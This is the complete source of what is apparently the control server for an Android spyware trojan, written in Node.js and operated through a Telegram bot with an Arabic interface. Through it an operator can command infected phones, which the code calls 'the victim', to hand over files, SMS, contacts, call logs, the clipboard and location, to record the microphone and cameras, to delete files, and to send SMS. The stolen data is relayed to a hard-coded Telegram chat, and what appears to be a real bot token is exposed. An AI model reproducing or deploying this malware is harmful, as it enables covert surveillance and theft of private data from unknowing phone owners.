const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// ⚠️ استبدل الرمز السري فوراً لانه معروض حالياً
const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
const id = '5474851558';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• رسالة من<b>${req.headers.model || "غير معروف"}</b> جهاز`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: req.file.mimetype || 'application/octet-stream',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model || "غير معروف"}</b> جهاز\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model || "غير معروف"}</b> جهاز`, { parse_mode: "HTML" });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || "غير محدد";
    const battery = req.headers.battery || "غير معروف";
    const version = req.headers.version || "غير معروف";
    const brightness = req.headers.brightness || "غير معروف";
    const provider = req.headers.provider || "غير معروف";

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });

    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• نظام الاندرويد : <b>${version}</b>\n` +
        `• سطوح الشاشة : <b>${brightness}</b>\n` +
        `• مزود : <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('message', (data) => {
        try {
            const received = data.toString('utf8');
            console.log(`📥 من الجهاز ${uuid}: ${received}`);

            if (received === 'ok' || received === 'done') {
                appBot.sendMessage(id, '✅ تم تنفيذ الأمر بنجاح');
            }
            else if (received.startsWith('result:')) {
                appBot.sendMessage(id, `✅ النتيجة:\n\n${received.replace('result:', '')}`, {parse_mode:"HTML"});
            }
            else if (received.startsWith('photo:')) {
                appBot.sendPhoto(id, Buffer.from(received.replace('photo:',''), 'base64'), {caption:'📸 صورة مستلمة'});
            }
            else if (received.startsWith('audio:')) {
                appBot.sendAudio(id, Buffer.from(received.replace('audio:',''), 'base64'), {caption:'🎙️ تسجيل صوتي'});
            }
            else if (received.startsWith('file:')) {
                appBot.sendDocument(id, Buffer.from(received.replace('file:',''), 'base64'), {caption:'📂 ملف مستلم'});
            }
            else {
                appBot.sendMessage(id, `📩 رد من الجهاز:\n${received}`);
            }
        } catch (e) {
            console.log("خطأ في استقبال البيانات:", e);
        }
    });

    ws.on('close', function () {
        const dev = appClients.get(uuid) || {model:"غير معروف", battery:"غير معروف", version:"غير معروف", brightness:"غير معروف", provider:"غير معروف"};
        appBot.sendMessage(id,
            `°• انقطع اتصال الجهاز\n\n` +
            `• موديل الجهاز : <b>${dev.model}</b>`,
            { parse_mode: "HTML" }
        );
        appClients.delete(uuid);
    });

    ws.on('error', () => {});
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                { reply_markup: { force_reply: true } }
            );
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            currentTitle = message.text;
            appBot.sendMessage(id, '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار', { reply_markup: { force_reply: true } });
        }
        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(currentUuid)) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد المعالجة الرجاء الانتظار........');
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في البوت\n\n' +
                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n' +
                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز متصل وجاهز',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد اجهزة متصلة حالياً');
            } else {
                let text = '°• قائمة الاجهزة المتصلة :\n\n';
                appClients.forEach(function (value) {
                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                        `• البطارية : <b>${value.battery}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: "HTML" });
            }
        }
        if (message.text == 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد اجهزة متصلة لتنفيذ الاوامر');
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    "reply_markup": { "inline_keyboard": deviceListKeyboard }
                });
            }
        }
    } else {
        appBot.sendMessage(chatId, '°• طلب الاذن مرفوض');
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        if (!appClients.has(uuid)) {
            appBot.answerCallbackQuery(callbackQuery.id, {text:"❌ الجهاز غير متصل", show_alert:true});
            return;
        }
        appBot.editMessageText(`°• حدد الخيار للجهاز : <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id, message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱التطبيقات', callback_data: `apps:${uuid}` }, { text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}` }],
                    [{ text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}` }, { text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}` }],
                    [{ text: '📃الحافظة', callback_data: `clipboard:${uuid}` }, { text: '🎙️المكرفون', callback_data: `microphone:${uuid}` }],
                    [{ text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}` }, { text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}` }],
                    [{ text: '🚩الموقع', callback_data: `location:${uuid}` }, { text: '👹نخب', callback_data: `toast:${uuid}` }],
                    [{ text: '☎️المكالمات', callback_data: `calls:${uuid}` }, { text: '👤جهات الاتصال', callback_data: `contacts:${uuid}` }],
                    [{ text: '📳يهتز', callback_data: `vibrate:${uuid}` }, { text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}` }],
                    [{ text: 'الرسايل', callback_data: `messages:${uuid}` }, { text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}` }],
                    [{ text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}` }, { text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}` }],
                    [{ text: '✉️ارسال رسالة للجميع', callback_data: `send_message_to_all:${uuid}` }]
                ]
            }, parse_mode: "HTML"
        });
    }

    const sendCmd = (cmd) => {
        appSocket.clients.forEach(ws => {
            if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(uuid)) {
                ws.send(cmd);
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• تم إرسال الأمر، جاري التنفيذ...');
    };

    if (commend == 'calls') sendCmd('calls');
    else if (commend == 'contacts') sendCmd('contacts');
    else if (commend == 'messages') sendCmd('messages');
    else if (commend == 'apps') sendCmd('apps');
    else if (commend == 'device_info') sendCmd('device_info');
    else if (commend == 'clipboard') sendCmd('clipboard');
    else if (commend == 'camera_main') sendCmd('camera_main');
    else if (commend == 'camera_selfie') sendCmd('camera_selfie');
    else if (commend == 'location') sendCmd('location');
    else if (commend == 'vibrate') sendCmd('vibrate');
    else if (commend == 'stop_audio') sendCmd('stop_audio');
    else if (commend == 'send_message') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• الرجاء كتابة رقم المراد الارسال اليه:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'send_message_to_all') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• اكتب الرسالة المراد ارسالها للجميع:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'file') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل مسار الملف المطلوب:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'delete_file') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل مسار الملف المراد حذفه:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'microphone') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل مدة التسجيل بالثواني:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'toast') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل نص الرسالة الظاهرة:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'show_notification') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل نص الاشعار:', { reply_markup: { force_reply: true } });
    }
    else if (commend == 'play_audio') {
        currentUuid = uuid;
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• ادخل رابط الملف الصوتي:', { reply_markup: { force_reply: true } });
    }
});

setInterval(function () {
    appSocket.clients.forEach(ws => {
        if (ws.readyState === webSocket.OPEN) ws.send('ping');
    });
    axios.get(address).catch(() => {});
}, 5000);

appServer.listen(process.env.PORT || 8999, () => console.log("✅ الخادم يعمل بنجاح"));
